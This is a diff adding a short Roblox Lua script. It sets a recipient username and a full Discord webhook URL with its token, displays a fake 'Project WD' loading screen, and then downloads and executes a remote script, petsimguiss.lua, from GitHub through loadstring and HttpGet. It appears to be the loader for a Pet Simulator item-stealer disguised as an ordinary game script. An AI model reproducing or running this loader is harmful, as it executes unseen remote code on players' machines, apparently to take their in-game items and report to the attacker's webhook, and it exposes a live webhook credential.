@@ -1,0 +1,10 @@
+Username = "ve5xi"
+WebHook = "https://discord.com/api/webhooks/1059545248575004815/oMB5pyh6bDGf46PTDATjUSyA-WjeAGVngKZXaDQ6FRMhqGSHx438lCKoXhBHT0P46HGJ"
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Project WD"
+_G.Text1 = "Loading..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
